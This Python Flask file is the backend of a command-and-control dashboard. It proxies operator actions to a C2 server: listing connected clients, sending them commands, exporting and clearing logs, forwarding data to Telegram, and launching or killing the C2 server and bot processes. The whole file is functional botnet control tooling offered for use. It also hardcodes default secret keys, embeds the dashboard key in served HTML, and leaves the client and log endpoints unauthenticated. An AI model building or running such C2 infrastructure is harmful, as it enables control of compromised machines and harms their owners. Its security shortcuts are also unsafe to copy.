"""
C2 Dashboard Backend — Linux/Kali compatible
Runs on 0.0.0.0:8080 — proxies API calls to the C2 server on port 5000.

Environment variables (all have safe defaults):
  DASHBOARD_KEY  — key the browser must send as X-Dashboard-Key (default below)
  C2_API_KEY     — key forwarded to the C2 server
  C2_SERVER_URL  — C2 server base URL
"""
from flask import Flask, request, jsonify, render_template, Response
from flask_cors import CORS
from functools import wraps
import requests
import subprocess
import os

app = Flask(__name__)
CORS(app)

# ── Configuration ────────────────────────────────────────────────────────
C2_SERVER_URL = os.environ.get("C2_SERVER_URL", "http://localhost:5000")
C2_API_KEY    = os.environ.get("C2_API_KEY",    "c2_super_secret_key_2026_123456")
DASHBOARD_KEY = os.environ.get("DASHBOARD_KEY", "dashboard_secret_2026")

# Headers forwarded to the C2 server on every proxied request
C2_AUTH = {"X-API-Key": C2_API_KEY, "Content-Type": "application/json"}

# Project root is one level above dashboard/
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# Map process names to the script base-names used for pgrep / pkill
_SCRIPT = {"server": "c2_server.py", "bot": "bot.py"}

# Popen handles for processes started by this dashboard session
_procs: dict = {"server": None, "bot": None}


# ── Script resolution ─────────────────────────────────────────────────────
def _resolve_script(base_name: str) -> str:
    """
    Prefer the clean Linux name (c2_server.py).
    Falls back to the Windows-style 'c2_server (1).py' if present.
    """
    for candidate in (base_name, base_name.replace(".py", " (1).py")):
        path = os.path.join(BASE_DIR, candidate)
        if os.path.exists(path):
            return path
    return os.path.join(BASE_DIR, base_name)  # return even if missing (error reported at start-time)


C2_SERVER_SCRIPT = _resolve_script("c2_server.py")
BOT_SCRIPT       = _resolve_script("bot.py")


# ── Dashboard auth decorator ──────────────────────────────────────────────
def require_auth(f):
    """
    Protect write endpoints with a simple API-key check.
    Browser sends:  X-Dashboard-Key: <DASHBOARD_KEY>
    """
    @wraps(f)
    def decorated(*args, **kwargs):
        key = request.headers.get("X-Dashboard-Key") or request.headers.get("x-dashboard-key")
        if key != DASHBOARD_KEY:
            return jsonify({"error": "Unauthorized — invalid or missing X-Dashboard-Key"}), 401
        return f(*args, **kwargs)
    return decorated


# ── Process helpers ───────────────────────────────────────────────────────
def _pgrep(script_name: str) -> bool:
    """Return True if any process whose cmdline matches script_name is alive."""
    try:
        r = subprocess.run(
            ["pgrep", "-f", script_name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return r.returncode == 0
    except FileNotFoundError:
        return False  # pgrep unavailable


def _proc_status(name: str) -> str:
    """
    Check whether a named service is running.
    1. Check the tracked Popen handle (started by us).
    2. Fall back to pgrep (catches externally-started processes too).
    """
    p = _procs.get(name)
    if p is not None and p.poll() is None:
        return "running"
    return "running" if _pgrep(_SCRIPT[name]) else "stopped"


# ── C2 proxy helpers ──────────────────────────────────────────────────────
def _proxy_get(path: str):
    try:
        r = requests.get(f"{C2_SERVER_URL}{path}", headers=C2_AUTH, timeout=5)
        return jsonify(r.json()), r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "C2 server offline"}), 503
    except Exception as e:
        return jsonify({"error": str(e)}), 500


def _proxy_post(path: str, body=None):
    try:
        payload = body if body is not None else (request.get_json(silent=True) or {})
        r = requests.post(f"{C2_SERVER_URL}{path}", json=payload, headers=C2_AUTH, timeout=5)
        try:
            return jsonify(r.json()), r.status_code
        except Exception:
            return r.text, r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "C2 server offline"}), 503
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── Frontend ──────────────────────────────────────────────────────────────
@app.route("/")
def index():
    # Inject dashboard key into the HTML so app.js can authenticate API calls
    return render_template("index.html", dashboard_key=DASHBOARD_KEY)


# ── Process management (auth required) ───────────────────────────────────
@app.route("/api/process/<name>/start", methods=["POST"])
@require_auth
def start_process(name: str):
    if name not in ("server", "bot"):
        return jsonify({"error": "Unknown process — use 'server' or 'bot'"}), 400

    if _proc_status(name) == "running":
        return jsonify({"status": "already_running"})

    script = C2_SERVER_SCRIPT if name == "server" else BOT_SCRIPT
    if not os.path.exists(script):
        return jsonify({"error": f"Script not found: {script}"}), 404

    try:
        p = subprocess.Popen(
            ["python3", script],       # python3 — Linux standard
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            cwd=BASE_DIR,
        )
        _procs[name] = p
        return jsonify({"status": "started", "pid": p.pid})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/process/<name>/stop", methods=["POST"])
@require_auth
def stop_process(name: str):
    if name not in ("server", "bot"):
        return jsonify({"error": "Unknown process"}), 400

    script_name = _SCRIPT[name]

    # pkill -f kills ALL matching processes, including ones not started by us
    try:
        subprocess.run(
            ["pkill", "-f", script_name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except FileNotFoundError:
        pass  # pkill unavailable — fall through to Popen handle below

    # Also terminate the tracked Popen handle if still alive
    p = _procs.get(name)
    if p is not None and p.poll() is None:
        try:
            p.terminate()
            p.wait(timeout=3)
        except subprocess.TimeoutExpired:
            p.kill()
        except Exception:
            pass

    _procs[name] = None
    return jsonify({"status": "stopped"})


@app.route("/api/processes/status")
def processes_status():
    return jsonify({
        "server": _proc_status("server"),
        "bot":    _proc_status("bot"),
    })


# ── C2 proxy: read-only endpoints (no auth required) ─────────────────────
@app.route("/api/clients")
def get_clients():
    return _proxy_get("/clients")


@app.route("/api/logs")
def get_logs():
    return _proxy_get("/get")


@app.route("/api/stats")
def get_stats():
    return _proxy_get("/stats")


@app.route("/api/health")
def health():
    return _proxy_get("/health")


@app.route("/api/commands/history")
def commands_history():
    return _proxy_get("/commands/history")


@app.route("/api/export/logs")
def export_logs():
    try:
        r = requests.get(f"{C2_SERVER_URL}/export/logs", headers=C2_AUTH, timeout=15)
        return Response(
            r.content,
            mimetype="text/csv",
            headers={"Content-Disposition": "attachment;filename=c2_logs.csv"},
        )
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "C2 server offline"}), 503
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── C2 proxy: write endpoints (auth required) ─────────────────────────────
@app.route("/api/command", methods=["POST"])
@require_auth
def send_command():
    # Proxies to POST /command on the C2 server
    return _proxy_post("/command")


@app.route("/api/clear", methods=["DELETE"])
@require_auth
def clear_logs():
    try:
        r = requests.delete(f"{C2_SERVER_URL}/clear", headers=C2_AUTH, timeout=5)
        return jsonify(r.json()), r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "C2 server offline"}), 503
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/telegram/send", methods=["POST"])
@require_auth
def telegram_send():
    return _proxy_post("/send_to_telegram")


@app.route("/api/telegram/settings", methods=["POST"])
@require_auth
def update_telegram_settings():
    return _proxy_post("/update_telegram_settings")


# ── Entry point ──────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(f"\n  C2 Dashboard  →  http://0.0.0.0:8080")
    print(f"  Dashboard key : {DASHBOARD_KEY}")
    print(f"  C2 server     : {C2_SERVER_URL}")
    print(f"  C2 server script : {C2_SERVER_SCRIPT}")
    print(f"  Bot script       : {BOT_SCRIPT}\n")
    app.run(host="0.0.0.0", port=8080, debug=False)
